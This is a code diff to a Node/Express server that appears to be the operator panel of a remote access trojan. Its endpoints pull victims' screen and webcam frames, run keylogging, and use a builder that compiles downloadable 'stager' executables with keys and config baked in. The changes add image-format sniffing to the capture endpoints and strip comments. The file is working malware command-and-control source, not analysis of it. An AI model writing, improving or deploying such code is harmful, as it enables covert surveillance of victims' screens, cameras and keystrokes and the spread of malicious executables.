@@ -428,12 +428,23 @@ app.get('/api/clients/:id/screen', requireAuth, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
-  const jpeg = getFrame(cid);
-  if (!jpeg) return res.status(204).end();
-  res.setHeader('Content-Type', 'image/jpeg');
+  const bytes = getFrame(cid);
+  if (!bytes) return res.status(204).end();
+
+  // sniff: RIFF....WEBP → image/webp, FFD8FF → image/jpeg, else octet-stream
+  let ctype = 'application/octet-stream';
+  if (bytes.length >= 12 &&
+      bytes[0] === 0x52 && bytes[1] === 0x49 && bytes[2] === 0x46 && bytes[3] === 0x46 &&
+      bytes[8] === 0x57 && bytes[9] === 0x45 && bytes[10] === 0x42 && bytes[11] === 0x50) {
+    ctype = 'image/webp';
+  } else if (bytes.length >= 3 && bytes[0] === 0xFF && bytes[1] === 0xD8 && bytes[2] === 0xFF) {
+    ctype = 'image/jpeg';
+  }
+
+  res.setHeader('Content-Type', ctype);
   res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
   res.setHeader('Pragma', 'no-cache');
-  res.send(jpeg);
+  res.send(bytes);
 });
 
 app.get('/api/clients/:id/monitors', requireAuth, (req, res) => {
@@ -484,11 +495,21 @@ app.get('/api/clients/:id/webcam', requireAuth, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
-  const jpeg = getWebcamFrame(cid);
-  if (!jpeg) return res.status(204).end();
-  res.setHeader('Content-Type', 'image/jpeg');
+  const bytes = getWebcamFrame(cid);
+  if (!bytes) return res.status(204).end();
+
+  let ctype = 'application/octet-stream';
+  if (bytes.length >= 12 &&
+      bytes[0] === 0x52 && bytes[1] === 0x49 && bytes[2] === 0x46 && bytes[3] === 0x46 &&
+      bytes[8] === 0x57 && bytes[9] === 0x45 && bytes[10] === 0x42 && bytes[11] === 0x50) {
+    ctype = 'image/webp';
+  } else if (bytes.length >= 3 && bytes[0] === 0xFF && bytes[1] === 0xD8 && bytes[2] === 0xFF) {
+    ctype = 'image/jpeg';
+  }
+
+  res.setHeader('Content-Type', ctype);
   res.setHeader('Cache-Control', 'no-store');
-  res.send(jpeg);
+  res.send(bytes);
 });
 
 app.post('/api/clients/:id/keylog/start', requireAuth, (req, res) => {
@@ -538,11 +559,9 @@ app.delete('/api/clients/:id/keylog', requireAuth, (req, res) => {
 const DOWNLOAD_DIR = path.join(__dirname, 'download');
 if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
 
-// base EXEs live here — the builder reads from this folder
 const EXE_DIR = path.join(__dirname, 'exe');
 if (!fs.existsSync(EXE_DIR)) fs.mkdirSync(EXE_DIR, { recursive: true });
 
-// built stager exes land here
 const BUILD_DIR = path.join(__dirname, 'build');
 if (!fs.existsSync(BUILD_DIR)) fs.mkdirSync(BUILD_DIR, { recursive: true });
 
@@ -586,7 +605,6 @@ app.get('/api/downloads/:name', limitDownloadExe, (req, res) => {
 
 // ---------- builder ----------
 
-// list base EXEs from exe/
 app.get('/api/build/bases', requireAuth, (req, res) => {
   let files = [];
   try { files = fs.readdirSync(EXE_DIR); } catch { return res.json([]); }
@@ -599,8 +617,6 @@ app.get('/api/build/bases', requireAuth, (req, res) => {
   res.json(bases);
 });
 
-// build a single self-extracting exe — compiles the launcher live with key+config+base baked in
-// key: client-supplied if non-empty, else falls back to the caller's account_key
 app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
   const { base, key, config } = req.body || {};
 
@@ -656,7 +672,6 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
   });
 });
 
-// list user's builds
 app.get('/api/builds', requireAuth, (req, res) => {
   const rows = db.prepare(sql`
     SELECT id, name, size, base, key, created_at FROM builds
@@ -665,7 +680,6 @@ app.get('/api/builds', requireAuth, (req, res) => {
   res.json(rows);
 });
 
-// download a build — raw exe
 app.get('/api/builds/:id/download', limitDownload, requireAuth, (req, res) => {
   const id = Number(req.params.id);
   const row = db.prepare(sql`
@@ -680,7 +694,6 @@ app.get('/api/builds/:id/download', limitDownload, requireAuth, (req, res) => {
   fs.createReadStream(src).pipe(res);
 });
 
-// delete a build
 app.delete('/api/builds/:id', requireAuth, (req, res) => {
   const id = Number(req.params.id);
   const row = db.prepare(sql`SELECT stored_name FROM builds WHERE id = ? AND user_id = ?`).get(id, req.user.uid);
